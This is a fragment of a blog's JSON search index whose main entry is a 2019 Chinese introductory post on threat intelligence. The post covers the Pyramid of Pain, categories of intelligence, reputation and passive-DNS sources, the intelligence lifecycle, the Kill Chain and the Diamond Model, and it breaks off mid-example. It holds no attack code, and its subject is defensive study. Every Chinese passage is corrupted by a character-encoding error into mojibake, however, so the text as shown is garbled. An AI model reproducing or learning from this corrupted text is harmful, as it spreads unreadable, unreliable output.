https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8 https://xz.aliyun.com/t/2044","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"Struts2","slug":"Struts2","permalink":"http://patrilic.top/tags/Struts2/"}]},{"title":"åˆè¯†å¨èƒæƒ…æŠ¥","slug":"åˆè¯†å¨èƒæƒ…æŠ¥","date":"2019-08-14T15:32:22.000Z","updated":"2019-08-20T15:30:37.034Z","comments":true,"path":"2019/08/14/åˆè¯†å¨èƒæƒ…æŠ¥/","link":"","permalink":"http://patrilic.top/2019/08/14/åˆè¯†å¨èƒæƒ…æŠ¥/","excerpt":"","text":"@Author: Patrilic@Time: 2019-08-14 23:32:22 0x00 å‰è¨€è‡ªä»æŠŠå­¦ä¹ é‡å¿ƒåå‘RedTeamç›¸å…³ä¹‹åï¼Œä¸€ç›´æƒ³å­¦ä¹ å…³äºå¨èƒæƒ…æŠ¥çš„ä¸œè¥¿ï¼Œå¹³æ—¶ä¹Ÿä¼šåœ¨å¾®æ­¥ç¤¾åŒºä¹‹ç±»çš„åœ°æ–¹å»çœ‹ä¸€äº›å…³äºå¨èƒçš„åˆ†ææŠ¥å‘Šã€‚ä»Šå¤©æ™šä¸Šç»ˆäºç©ºäº†ä¸‹æ¥ï¼Œå‡†å¤‡å¥½å¥½çš„æ²‰æ·€ä¸€ä¸‹ï¼Œæœ€è¿‘å‘ç”Ÿå¾ˆå¤šäº‹æƒ…ï¼Œå¹¶ä¸”æ¥äº†ä¸ªé¡¹ç›®ï¼Œä¸€ç›´åœ¨å¿™ï¼Œè¿™å‡ å¤©å°±å¥½å¥½çš„æ²‰é™ä¸‹æ¥å»ç³»ç»Ÿè®¤è¯†ä¸€ä¸‹è¿™ä¸ªä¸œè¥¿ 0x01 ç›¸å…³æ¦‚å¿µå®šä¹‰ç¿»äº†å¾ˆå¤šæ–‡ç« ï¼Œå¤§å¤šæ•°éƒ½æ˜¯è®¤ä¸ºå¨èƒæƒ…æŠ¥çš„å®šä¹‰ä¸ºGartneråœ¨2014å¹´å‘è¡¨çš„ã€Šå®‰å…¨å¨èƒæƒ…æŠ¥æœåŠ¡å¸‚åœºæŒ‡å—ã€‹ åŸºäºä¸€å®šçŸ¥è¯†çš„è¯æ®ï¼Œå·²ç»å­˜åœ¨æˆ–æ­£åœ¨å½¢æˆçš„æ½œåœ¨å¨èƒï¼Œæ¯”å¦‚ï¼Œä¸Šä¸‹æ–‡ã€æœºåˆ¶ã€æŒ‡æ ‡ã€æ„ä¹‰ä»¥åŠå¯å®æ–½çš„å»ºè®®ï¼Œåˆ©ç”¨è¿™äº›ï¼Œå¯ä»¥å¸®åŠ©å½“äº‹äººå½¢æˆåº”å¯¹è¿™äº›å±é™©çš„å†³ç­–ã€‚ the-pyramid-of-painè¿™ä¸ªé‡‘å­—å¡”éå¸¸æ˜æ˜¾çš„å±•ç¤ºäº†å…³äºæƒ…æŠ¥å’Œåˆ©ç”¨çš„å›°éš¾åº¦å¯¹åº”çš„å…³ç³»ï¼ŒåŒæ—¶ä¹Ÿå’Œæƒ…æŠ¥çš„ä»·å€¼ç›¸å…³ ä»ä¸‹å¾€ä¸Šçœ‹ï¼šHash Valueï¼šHashå€¼æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„å”¯ä¸€å‡­è¯ï¼Œç±»ä¼¼äºæˆ‘ä»¬åœ¨VirusTotalä¸­æäº¤æ ·æœ¬é‚£ä¸²hashï¼Œä½†æ˜¯å¦‚æœæ–‡ä»¶ä¸­æœ‰ä¸€ç‚¹ä¸œè¥¿è¢«æ”¹å˜äº†ï¼Œéƒ½ä¼šå¯¼è‡´è¿™ä¸ªæ–‡ä»¶çš„Hashå€¼å˜å¾—ä¸åŒï¼Œæ‰€ä»¥åè€Œï¼Œä¸€ä¸ªæ ·æœ¬çš„hashä¹Ÿæ˜¯æœ€ä¸å€¼å¾—è·Ÿè¸ªçš„ï¼Œå½“ç„¶ä»·å€¼ä¹Ÿæœ€ä½ã€‚ Ip Addressesï¼šIPåœ°å€ï¼Œå¦‚æœæ”»å‡»è€…å¸¸ç”¨çš„Pentest Serverè¢«è®°å½•ä¸‹æ¥çš„è¯ï¼Œä¹Ÿæœ‰ä¸€å®šçš„ä»·å€¼ï¼Œä¸è¿‡ç›®å‰æ¥è¯´ï¼Œç»å¤§éƒ¨åˆ†äººä½¿ç”¨C2åŸŸåæ¥éšè—è‡ªå·±çš„æ”»å‡»ï¼ŒåŒæ—¶ä½¿ç”¨CDN/ä»£ç†ä¹‹ç±»çš„æ‰‹æ®µçš„æ¥ä¸åœçš„å˜æ¢è‡ªå·±çš„IPï¼Œæ¥ç»•è¿‡è·Ÿè¸ªã€‚ Domain Namesï¼šåŸŸåçš„è¯æ˜¯ç°åœ¨å¤§å¤šæ•°éšè”½æ”»å‡»çš„æ–¹å¼ï¼Œæ³¨å†Œä¸€ä¸ªç±»ä¼¼åŸŸåï¼Œé…åˆä½¿ç”¨é±¼å‰æ”»å‡»çš„å·¥å…·å¯ä»¥è¾¾åˆ°é‚®ä»¶é’“é±¼ä¹‹ç±»çš„ç›®çš„ã€‚åŸŸåçš„è¯éœ€è¦æ³¨å†Œï¼Œå¤‡æ¡ˆï¼Œç„¶åä¸æœåŠ¡å™¨è¿›è¡Œç»‘å®šï¼Œæ‰€ä»¥å‡†å¤‡çš„ä¸œè¥¿è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼éšè”½æ”»å‡»çš„æ•ˆæœä¹Ÿè¾ƒå¥½ï¼Œç‰¹åˆ«æ˜¯å¦‚æœå­˜åœ¨Subdomain Takeoverè¿™æ ·çš„æ¼æ´ï¼Œæ•ˆæœéå¸¸çš„æ£’ã€‚ä½†æ˜¯åœ¨å¤§å‹APTè¡ŒåŠ¨ä¸­ï¼Œæ”»å‡»è€…ä¹Ÿä¼šå‡†å¤‡å¤§é‡åŸŸåï¼Œæ‰€ä»¥è¿™ä¸ªçš„ä»·å€¼å°±æ˜¾å¾—ä¸æ˜¯ç‰¹åˆ«çš„é«˜äº†ã€‚ æ·±å…¥è§£æå­åŸŸåæ¥ç®¡ï¼ˆSubdomain Takeoverï¼‰æ¼æ´ Network/Host Artifactsï¼šé¡¾åæ€ä¹‰ï¼Œè¿™ä¸€å±‚æ˜¯ç½‘ç»œä¸ä¸»æœºç‰¹å¾ï¼Œè¿™é‡Œç‰¹å¾å¹¶ä¸å•å•åŒ…æ‹¬æ”»å‡»è€…çš„å„ç§ä¸»æœºä¿¡æ¯ï¼Œä¾‹å¦‚è®¿é—®çš„ç‰¹å®šUAå¤´ç­‰ï¼Œè¿˜åŒ…æ‹¬äº†æ”»å‡»è€…æ‰€è·å¾—çš„è´¦å·å¯†ç ï¼Œä¾‹å¦‚ä»æŸä¸€ä¸ªVPNè´¦å·è¿æ¥è‡³å†…ç½‘ï¼Œç„¶ååˆä»æŸä¸€å°å‡ºå£æœºå™¨èµ°å‡ºçš„æµé‡ç­‰ã€‚ Toolsï¼šç‰¹å®šç»„ç»‡/å•ç‹¬çš„é»‘å®¢é€šå¸¸ä¼šä½¿ç”¨ç›¸åŒæˆ–ç›¸ä¼¼çš„æ–¹æ³•è¿›è¡Œæ”»å‡»ï¼Œè·å¾—äº†ä½¿ç”¨çš„å·¥å…·ç‰¹å¾ï¼Œå°±èƒ½è¿›è¡Œé’ˆå¯¹æ€§çš„å…æ€ç­‰ï¼Œè®©æ”»å‡»è€…å¢åŠ æˆæœ¬TTPsï¼šTacticsã€Techniques &amp; Proceduresï¼ŒTTPsåœ¨æ”»å‡»æ–¹ä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼ŒæŒ‡æ‰€ä½¿ç”¨çš„æ”»å‡»ç­–ç•¥ã€æ‰‹æ³•ç­‰ï¼Œäº†è§£äº†ä¸€ä¸ªç»„ç»‡çš„TTPsï¼Œå°±èƒ½æ˜ç™½æ”»å‡»è€…æ‰€åˆ©ç”¨çš„å…·ä½“æ¼æ´ï¼Œç„¶åå»é˜²å¾¡ã€‚ åˆ†ç±»è¿™é‡Œæ¨ä¸€æ³¢@e1knotå¸ˆå‚…åœ¨Defcon Groupä¸Šçš„æ¼”è®²PPT ğŸ‘‰ https://www.slideshare.net/JeremyLi10/discover-advanced-threats-with-threat-intelligence-jeremy-li ä¼ ç»Ÿåˆ†ç±»æ¥çœ‹ï¼Œå¨èƒæƒ…æŠ¥åˆ†ä¸ºï¼š æˆ˜æœ¯æƒ…æŠ¥ æˆ˜ç•¥æƒ…æŠ¥ è¿è¥æƒ…æŠ¥ æˆ˜æœ¯çº§æƒ…æŠ¥ï¼šæˆ˜æœ¯æƒ…æŠ¥çš„ä½œç”¨ä¸»è¦æ˜¯å‘ç°å¨èƒäº‹ä»¶ä»¥åŠå¯¹æŠ¥è­¦ç¡®è®¤æˆ–ä¼˜å…ˆçº§æ’åºã€‚å¸¸è§çš„å¤±é™·æ£€æµ‹æƒ…æŠ¥ï¼ˆCnC æƒ…æŠ¥ï¼Œå³æ”»å‡»è€…æ§åˆ¶è¢«å®³ä¸»æœºæ‰€ä½¿ç”¨çš„è¿œç¨‹å‘½ä»¤ä¸æ§åˆ¶æœåŠ¡å™¨æƒ…æŠ¥ï¼‰ã€IPæƒ…æŠ¥å°±å±äºè¿™ä¸ªèŒƒç•´ï¼Œå®ƒä»¬éƒ½æ˜¯å¯æœºè¯»çš„æƒ…æŠ¥ï¼Œå¯ä»¥ç›´æ¥è¢«è®¾å¤‡ä½¿ç”¨ï¼Œè‡ªåŠ¨åŒ–çš„å®Œæˆä¸Šè¿°çš„å®‰å…¨å·¥ä½œã€‚ è¿è¥çº§æƒ…æŠ¥ï¼šè¿è¥çº§æƒ…æŠ¥æ˜¯ç»™å®‰å…¨åˆ†æå¸ˆæˆ–è€…è¯´å®‰å…¨äº‹ä»¶å“åº”äººå‘˜ä½¿ç”¨çš„ï¼Œç›®çš„æ˜¯å¯¹å·²çŸ¥çš„é‡è¦å®‰å…¨äº‹ä»¶åšåˆ†æï¼ˆæŠ¥è­¦ç¡®è®¤ã€æ”»å‡»å½±å“èŒƒå›´ã€æ”»å‡»é“¾ä»¥åŠæ”»å‡»ç›®çš„ã€æŠ€æˆ˜æœ¯æ–¹æ³•ç­‰ï¼‰æˆ–è€…åˆ©ç”¨å·²çŸ¥çš„æ”»å‡»è€…æŠ€æˆ˜æœ¯æ‰‹æ³•ä¸»åŠ¨çš„æŸ¥æ‰¾æ”»å‡»ç›¸å…³çº¿ç´¢ã€‚ æˆ˜ç•¥çº§æƒ…æŠ¥ï¼šæˆ˜ç•¥å±‚é¢çš„å¨èƒæƒ…æŠ¥æ˜¯ç»™ç»„ç»‡çš„å®‰å…¨ç®¡ç†è€…ä½¿ç”¨çš„ï¼Œæ¯”å¦‚CSOã€‚å®ƒèƒ½å¤Ÿå¸®åŠ©å†³ç­–è€…æŠŠæ¡å½“å‰çš„å®‰å…¨æ€åŠ¿ï¼Œåœ¨å®‰å…¨å†³ç­–ä¸Šæ›´åŠ æœ‰ç†æœ‰æ®ã€‚åŒ…æ‹¬äº†ä»€ä¹ˆæ ·çš„ç»„ç»‡ä¼šè¿›è¡Œæ”»å‡»ï¼Œæ”»å‡»å¯èƒ½é€ æˆçš„å±å®³æœ‰å“ªäº›ï¼Œæ”»å‡»è€…çš„æˆ˜æœ¯èƒ½åŠ›å’ŒæŒæ§çš„èµ„æºæƒ…å†µç­‰ï¼Œå½“ç„¶ä¹Ÿä¼šåŒ…æ‹¬å…·ä½“çš„æ”»å‡»å®ä¾‹ã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”-æ‰‹åŠ¨åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ ç„¶å@e1knotå¸ˆå‚…åœ¨çŸ¥ä¹ä¸“æ ä¸­æåˆ°äº†å¦ä¸€ç§åˆ†ç±»æ–¹å¼ï¼Œåœ¨æˆ‘çœ‹æ¥è¿™ç§ä¹Ÿæ˜¯æ›´åŠ å®¹æ˜“ç†è§£çš„ï¼ˆèµï¼‰ ğŸ‘‰ https://zhuanlan.zhihu.com/p/30105006 å¤§æ¦‚å°±æ˜¯åˆ†ä¸ºå¦‚ä¸‹å‡ ç§ç±»å‹ï¼š IP/Domain ä¿¡èª‰ç±»æƒ…æŠ¥ ç½‘ç»œé€šä¿¡æµé‡æ•°æ® äº‹ä»¶åˆ†ç±»ï¼ˆIncident Pulseï¼‰æ•°æ® èœœç½æ•°æ® è¢«åŠ¨æµé‡è§£æï¼ˆPassive DNSï¼‰æ•°æ® ï¼ˆç›¸ä¿¡å„ä½æ¸—é€æµ‹è¯•å·¥ä½œè€…ä¹Ÿå¸¸å¸¸åœ¨å®æˆ˜ä¸­é‡åˆ°èœœç½è¿™ç±»ä¸œè¥¿ï¼Œç¨ä¸æ³¨æ„å°±ä¼šæŠŠè‡ªå·±å¸¸ç”¨çš„å§¿åŠ¿å’Œæ‰‹æ®µâ€œé€â€ç»™ä¼ä¸šï¼‰ IP/Domain ä¿¡èª‰ç±»æƒ…æŠ¥ï¼šç»å¸¸é€›å¾®æ­¥ç¤¾åŒºæˆ–è€…ç”¨å®ƒæ¥æ‰¾è¿‡dnsè§£æä¹‹ç±»çš„å¸ˆå‚…è‚¯å®šä¹Ÿä¼šå‘ç°ï¼ŒIPæˆ–è€…åŸŸåä¼šè¢«æ‰“ä¸Šå„ç§æ ‡ç­¾ï¼Œä¾‹å¦‚ï¼š ä»¥ä¸‹å¹³å°å¯ä»¥ä¾›æˆ‘ä»¬æ–¹ä¾¿çš„æŸ¥è¯¢åˆ°è¿™ä¸ªIP/Domainiæ˜¯ä¸æ˜¯å·²ç»è¢«åˆ—ä¸ºæ¶æ„IP/Domainï¼Œæˆ–è€…ä»–åœ¨æŸä¸€æ®µæ—¶é—´æ˜¯å¦æ˜¯è¢«æ¶æ„æ”»å‡»è€…æ”»é™·ç­‰ã€‚ å¾®æ­¥åœ¨çº¿ - https://x.threatbook.cn å¥‡å®‰ä¿¡å¨èƒæƒ…æŠ¥ä¸­å¿ƒ - https://ti.qianxin.com/ RiskIQ Community - https://community.riskiq.com ä½†æ˜¯ç”±äºä¸åŒçš„å¨èƒå¹³å°çš„æ£€æµ‹å¯èƒ½ä¸åŒï¼Œå¯¼è‡´ç»“æœå¯èƒ½æœ‰åå·®ç­‰ã€‚æ‰€ä»¥ç›¸å¯¹å…¶ä»–çš„ï¼Œåè€Œæˆä¸ºäº†ç›¸å¯¹æœ€æ²¡æœ‰ä»·å€¼çš„æƒ…æŠ¥ ç½‘ç»œé€šä¿¡æµé‡æ•°æ®ï¼šè¿™é‡ŒæŒ‡ä»å¤§ç½‘ä¸Šé‡‡é›†çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¿—ç§°çš„å¤–ç½‘æ•°æ®ã€‚ä¸»è¦æ˜¯çœ‹ç›®æ ‡æœåŠ¡å™¨çš„æµé‡æ³¢åŠ¨ï¼Œæ¯”å¦‚å¦‚æœåœ¨æŸä¸€ä¸ªç«¯å£ä¸Šçš„æµé‡åœ¨ä¸€æ®µæ—¶é—´å‰§å¢ï¼Œå¯èƒ½å­˜åœ¨è¢«å…¥ä¾µçš„é£é™© äº‹ä»¶åˆ†ç±»ï¼šè¿™é‡Œæä¸€ä¸‹ä¸¤ä¸ªæ¦‚å¿µï¼š CERTï¼šComputer emergency response team ç»´åŸºç™¾ç§‘ï¼šwiki CIRTï¼šCritical Incident Response Team ç»´åŸºç™¾ç§‘ï¼šwiki å…·ä½“å¯ä»¥æŸ¥çœ‹åé¢çš„ç»´åŸºç™¾ç§‘é“¾æ¥è¿›è¡Œäº†è§£ç„¶åæ˜¯äº‹ä»¶åˆ†ç±»å¤§æ¦‚å°±æ˜¯ï¼Œå°†å¨èƒæƒ…æŠ¥çš„åŸºç¡€æ•°æ®è¿›è¡Œæ‰“åŒ…åˆ†ç±»ï¼Œç„¶åå°è£…æˆä¸€ä¸ªä¸ªçš„äº‹ä»¶ã€‚è¿™ç§æƒ…æŠ¥çš„å¥½å¤„åœ¨å“ªé‡Œå‘¢ï¼Œä¸€ä¸ªæ˜¯å¯ä»¥åŸºæœ¬å…¨é¢çš„è¿›è¡Œå¨èƒåˆ†æï¼Œç„¶åæå‰é¢„è­¦ã€‚ç„¶ååŒæ—¶ä¹Ÿå¯ä»¥æ›´å¿«çš„å‘ç°äº‹ä»¶ã€‚ç„¶åå‚å•†ç»è¿‡æ•´ç†åï¼Œå¯ä»¥é€šè¿‡è®¢é˜…çš„æ–¹å¼è¿›è¡Œé¢„è­¦ï¼ŒåŒæ—¶æ”¶å–è®¢é˜…è´¹ç”¨ã€‚ä¾‹å¦‚ï¼š å¾®æ­¥åœ¨çº¿ Alienvault OTX https://otx.alienvault.com IBM X-Force Exchange https://exchange.xforce.ibmcloud.com/ èœœç½æ•°æ®ï¼šè¿™ä¸ªä¸œè¥¿æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå°±æ˜¯ä¼ä¸šéƒ¨ç½²åœ¨å†…ç½‘æˆ–è€…å¤–ç½‘ï¼ˆå¾ˆå°‘ï¼‰çš„ä¸€äº›çœ‹ä¼¼è–„å¼±ç‚¹ï¼Œå¼•è¯±æ”»å‡»è€…è¿›è¡Œæ”»å‡»ï¼Œæš´éœ²è‡ªå·±çš„è¡Œä¸ºç‰¹å¾ç”šè‡³æ˜¯TTP ç„¶åæœ€è¿‘å†°æ€»ç¤¾åŒºé‡Œå‘äº†ä¸ªæŒºå¥½ç©çš„å¼€æºèœœç½ï¼šğŸ‘‰ https://bithack.io/forum/484 è¢«åŠ¨æµé‡è§£æï¼šå…¶å®å°±æ˜¯è¢«åŠ¨DNSï¼ˆPassive DNSï¼‰ï¼Œä¹Ÿæ˜¯ä¸€ç§æ¯”è¾ƒè€çš„æŠ€æœ¯äº†ï¼Œä½†æ˜¯ä¾ç„¶å¾ˆå¸¸ç”¨ï¼Œç‰¹åˆ«æ˜¯æº¯æºå†…ç½‘æ¶æ„æµé‡çš„æ—¶å€™..ä¸‹é¢è¿™å‡ ç¯‡æ–‡ç« è®²çš„å¾ˆè¯¦ç»†äº†ï½å°±ä¸å¤šè®²äº† How to Use Passive DNS to Inform Your Incident Response What is Passive DNS? A beginnerâ€™s guide Passive DNS ç”Ÿå‘½å‘¨æœŸ ã€ŠMarket Guide for Security Threat Intelligence Serviceã€‹ â€“ Gartner . 2014 åœ¨ä¸šç•Œæ¥å—è¾ƒå¹¿ï¼Œè€Œä»–è®¤ä¸ºæƒ…æŠ¥æ˜¯è¿‡ç¨‹çš„äº§ç‰©ï¼Œè€Œéç‹¬ç«‹æ•°æ®ç‚¹çš„åˆé›†ã€‚Gartneråˆ»ç”»äº†å¨èƒæƒ…æŠ¥çš„ç”Ÿå‘½å‘¨æœŸï¼š å®šå‘ï¼šå®šä¹‰ç›®æ ‡å¹¶å®Œå–„ æ”¶é›†ï¼šä»å¤šç§å¼€æ”¾æˆ–å°é—­çš„æºæ”¶é›†æ•°æ®ï¼›ç”µå­çš„ã€äººå·¥çš„ å¤„ç†ï¼šå¦‚æœ‰éœ€è¦ï¼Œç¿»è¯‘ï¼›è¿›è¡Œå¯é æ€§è¯„ä¼°ï¼›æ ¸å¯¹å¤šä¸ªæº åˆ†æï¼šåˆ¤æ–­æ­¤ä¿¡æ¯çš„æ„ä¹‰ï¼›è¯„ä¼°ä¿¡æ¯çš„é‡è¦æ€§ï¼›æ¨èç›¸åº”æªæ–½ ä¼ é€’ï¼šå°†æƒ…æŠ¥ä¼ é€’ç»™å®¢æˆ· åé¦ˆï¼šä¾ç…§éœ€æ±‚è°ƒæ•´ æ„ä¹‰åŒæ ·ä¹Ÿæ˜¯@e1knotå¸ˆå‚…æ–‡ç« ä¸­æåˆ°çš„ï¼Œå¨èƒæƒ…æŠ¥åœ¨å®‰å…¨è¿è¥ä½“ç³»ä¸­çš„å®šä½æ˜¯â€”â€”è¾…åŠ©å‘ç°æ½œåœ¨çš„æˆ–æ­£åœ¨å‘èµ·çš„æ¶æ„è¡Œä¸ºæˆ–æ“ä½œï¼Œé‡ç‚¹åœ¨äºè¾…åŠ©ä¸¤ä¸ªå­—ï¼Œå¨èƒæƒ…æŠ¥ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´åªèƒ½æœ‰é™çš„æ„ŸçŸ¥æ½œåœ¨çš„å¨èƒï¼Œæ¢å¥è¯è¯´ï¼šå¦‚æœæœ‰äººç°åœ¨ç„å‡†çš„ç›®æ ‡å…¨éƒ¨éƒ½æ˜¯èƒ½æºç±»å®¢æˆ·ï¼Œé‚£ä¹ˆå¨èƒæƒ…æŠ¥å°±å¯ä»¥æé†’æ²¡æœ‰è¢«æ”»å‡»çš„å®¢æˆ·å¯èƒ½ä¼šé­å—åˆ°è¯¥æ”»å‡»è€…çš„æ”»å‡»ï¼Œè¿™ä¸ªå«åšæœ‰é™çš„æ„ŸçŸ¥æ½œåœ¨çš„å¨èƒã€‚ 0x02 åˆ†ææ¨¡å‹https://www.slideshare.net/JeremyLi10/application-of-threat-intelligence-in-security-operation?utm_source=slideview&amp;utm_medium=ssemail&amp;utm_campaign=first_clip æ—¢ç„¶å¨èƒæƒ…æŠ¥æ˜¯ä¸ªè¾…åŠ©æ‰‹æ®µï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬é€šè¿‡ä½¿ç”¨å¨èƒæƒ…æŠ¥è¿›è¡Œåˆ†æï¼Œæ‰æ˜¯æœ€ä¸»è¦çš„ã€‚è¿™é‡Œç›®å‰ç”¨çš„æ¯”è¾ƒå¤šçš„å°±æ˜¯ä¸¤å¤§æ¨¡å‹ï¼š Kill Chain Diamond Model ä½†æ˜¯æˆ‘è§‰å¾—ç°åœ¨åº”è¯¥å†åŠ ä¸€ä¸ªATT&amp;CKçŸ©é˜µï¼Œæ¯”å¦‚ä»¥æœ€å‡ºåçš„MITRE ATT&amp;CKä¸¾ä¾‹ï¼Œé‡Œé¢åŸºæœ¬ä¸Šé›†åˆäº†ç»å¤§éƒ¨åˆ†çš„å…¥ä¾µæ¨¡å‹ã€‚ğŸ‘‰ MITRE ATT&amp;CK Kill-Chainæ¨¡å‹è¿™ä¸ªæ¨¡å‹å…¶å®å’ŒPTESæ¯”è¾ƒç›¸ä¼¼ï¼Œåšæ¸—é€æ¯”è¾ƒå¤šçš„åŒå­¦åº”è¯¥éƒ½æ¯”è¾ƒäº†è§£äº† ä¾¦æŸ¥é˜¶æ®µï¼šæ‰«æç›®æ ‡ITèµ„äº§å’Œä¿¡æ¯æ”¶é›†ï¼Œæ¯”å¦‚è¯´Google Hackingè¿™äº›ä¾¦æŸ¥ç±»å‹çš„æ”»å‡» æ­¦å™¨åŒ–é˜¶æ®µï¼šå°†å‰ä¸€é˜¶æ®µå‘ç°å’Œæ‰«æåˆ°æ¼æ´çš„ä¿¡æ¯æ•´åˆåˆ°ä¸€èµ·å¹¶åˆ¶ä½œé’ˆå¯¹æ€§çš„æ­¦å™¨ï¼ˆå½“ç„¶å›½å†…çš„å˜›ï¼Œä½ æ‡‚å¾—ï¼‰ éƒ¨ç½²é˜¶æ®µï¼šå°†è¿™äº›æ­¦å™¨æˆ–è€…æ˜¯è¿œæ§RATéƒ¨ç½²åˆ°å¯¹åº”çš„Compromised Serversä¸Š æ”»å‡»é˜¶æ®µï¼šä½¿ç”¨è¿™äº›Compromised Serverså’Œä¹‹å‰åšå¥½çš„æ­¦å™¨åŒ–å·¥å…·å¯¹ç›®æ ‡å‘èµ·æ”»å‡» åé—¨ç§æ¤é˜¶æ®µï¼šå®‰è£…è¿œç¨‹æ§åˆ¶çš„æœåŠ¡å’Œè¿›ç¨‹ è¿œæ§é˜¶æ®µï¼šè®©ç›®æ ‡å’ŒC&amp;Cé€šä¿¡ åæ¸—é€é˜¶æ®µï¼šæ”¶å‰²ã€ç»§ç»­æ¨ªå‘æ¸—é€å…¥ä¾µ è¿˜æ˜¯ç»™ä¸€ä¸ªé“¾æ¥ï¼špentest-standardPTESåŸºæœ¬æµç¨‹ï¼š Pre-engagement Interactions Intelligence Gathering Threat Modeling Vulnerability Analysis Exploitation Post Exploitation Reporting Kill-Chainæ¨¡å‹åŸºæœ¬ä¸Šå°±æ˜¯æè¿°äº†æ”»å‡»è€…çš„è¿›æ”»è·¯çº¿ï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ˜ç¡®çš„è¯´æ˜é€ æˆçš„å½±å“å’Œç›®çš„ã€‚ Diamond Modelæ¨¡å‹é’»çŸ³æ¨¡å‹æ˜¯ä¸€ä¸ªé’ˆå¯¹å•ä¸ªäº‹ä»¶åˆ†æçš„æ¨¡å‹ï¼Œæ ¸å¿ƒå°±æ˜¯ç”¨æ¥æè¿°æ”»å‡»è€…çš„æŠ€æˆ˜æœ¯å’Œç›®çš„ï¼Œå…·ä½“çš„é’»çŸ³æ¨¡å‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é’»çŸ³æ¨¡å‹ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šç½®ä¿¡åº¦ã€å…ƒæ•°æ®ã€ç¤¾ä¼š-æ”¿æ²»å½±å“å’ŒæŠ€æˆ˜æœ¯ç»„åˆ ç¤¾ä¼šæ”¿æ²»å½±å“ï¼šå¤„äºé’»çŸ³æ¨¡å‹ä¸Šä¸‹ä¸¤ä¸ªé¡¶ç‚¹ï¼Œä¸Šé¡¶ç‚¹è¡¨ç¤ºæ”»å‡»è€…ï¼Œä¸‹é¡¶ç‚¹è¡¨ç¤ºå—å®³è€…ä¹Ÿå°±æ˜¯ç›®æ ‡ã€‚æ”»å‡»è€…å’Œå—å®³è€…ä¹‹é—´çš„æŸç§åˆ©ç›Šå†²çªæˆ–è€…æ˜¯ç¤¾ä¼šåœ°ä½å¯¹ç«‹åˆ™ä¼šäº§ç”Ÿæ”»å‡»çš„æ„å›¾å’Œå‘èµ·æ”»å‡»çš„åŸå› ï¼Œçºµåˆ‡é¢è¡¨ç¤ºçš„å°±æ˜¯ç¤¾ä¼šæ”¿æ²»å½±å“ã€‚è¯´å¤§ç™½è¯å°±æ˜¯æ ¹æ®è¿™ä¿©äººå»å‘ç°æ”»å‡»çš„æ„å›¾ã€‚ æŠ€æˆ˜æœ¯ç»„åˆï¼šæŠ€æˆ˜æœ¯ç»„åˆä½äºæ•´ä¸ªé’»çŸ³æ¨¡å‹çš„æ¨ªåˆ‡é¢ï¼Œæ¨ªåˆ‡é¢çš„ä¸¤ä¸ªé¡¶ç‚¹åˆ†åˆ«ä¸ºåŸºç¡€è®¾æ–½å’ŒæŠ€æœ¯èƒ½åŠ›ï¼Œè¿™é‡Œçš„åŸºç¡€è®¾æ–½å’ŒæŠ€æœ¯èƒ½åŠ›å…¶å®éƒ½æ˜¯ç›¸å¯¹äºæ”»å‡»è€…è€Œè¨€çš„ã€‚ å…ƒæ•°æ®ï¼šè¿™ä¸ªå…¶å®å°±æ˜¯å·¦è¾¹åˆ—å‡ºæ¥çš„ï¼Œæ”»å‡»æ—¶é—´ã€æ”»å‡»é˜¶æ®µã€æ”»å‡»ç»“æœã€æ”»å‡»æ–¹å‘ã€æ”»å‡»æ‰‹æ®µã€æ”»å‡»èµ„æºåˆ©ç”¨ã€‚ ç½®ä¿¡åº¦ï¼šä¹Ÿå°±æ˜¯ä»¥ä¸Šä½ åˆ†æå‡ºç»“æœçš„å¯ä¿¡ç¨‹åº¦ã€‚ é’»çŸ³æ¨¡å‹æƒ³è¦è¡¨è¾¾çš„å…¶å®å°±æ˜¯é’ˆå¯¹å•ä¸ªå®‰å…¨äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ”»å‡»è€…ä¸ºä»€ä¹ˆæƒ³è¦æ”»å‡»ç›®æ ‡ï¼Œæ‰“ç®—ç”¨ä»€ä¹ˆæ‰‹æ®µå»æ”»å‡»ç›®æ ‡ã€‚ Kill-Chain + Diamond Modelç›´æ¥ä¸¾ä¸ªä¾‹å­@e1knotå¸ˆå‚…ç»™çš„ä¾‹å­ï¼š å¤æ‚çš„æ”»å‡»å¾€å¾€éƒ½æ˜¯æœ‰ä¸€ç³»åˆ—çš„æ”»å‡»äº‹ä»¶ç»„æˆçš„ï¼Œä¸åŒçš„æ”»å‡»äº‹ä»¶æŒ‡å‘çš„ç›®æ ‡å’Œè¾¾åˆ°çš„ç›®çš„å¯ä»¥è¡¨ç¤ºå‡ºæ”»å‡»çš„è¿›ç¨‹ï¼Œé‚£ä¹ˆOKï¼Œæˆ‘ä»¬å¦‚æœæŠŠäº‹ä»¶æŒ‰ç…§Kill-Chainè¿›è¡Œåˆ†ç±»åŒæ—¶ä½¿ç”¨æ³³é“å›¾è¿›è¡Œè¡¨ç¤ºï¼ŒåŒæ—¶æŠŠä¸åŒçš„æ”»å‡»è·¯çº¿åˆ†ä¸ºä¸åŒçš„æ”»å‡»çº¿ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªè¿™æ ·çš„æ³³é“å›¾ã€‚å…¶å®è¿™å¼ å›¾æè¿°çš„æ˜¯è¿™ä¹ˆä¸€ä¸ªäº‹ä»¶ï¼š12345678910111213141.æ”»å‡»è€…å…ˆå¯¹ç›®æ ‡è¿›è¡Œäº†Google 